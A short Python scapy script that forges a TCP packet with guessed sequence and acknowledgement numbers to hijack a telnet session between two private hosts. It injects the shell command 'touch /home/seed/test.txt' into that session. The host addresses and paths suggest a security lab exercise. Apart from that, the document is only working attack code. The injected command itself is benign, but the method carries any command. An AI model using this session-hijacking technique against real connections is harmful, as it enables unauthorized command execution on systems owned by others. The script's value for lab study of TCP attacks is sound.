#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=34248, dport=23, flags="A", seq=2167975968, ack=4057079861)
data = "\n touch /home/seed/test.txt\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)


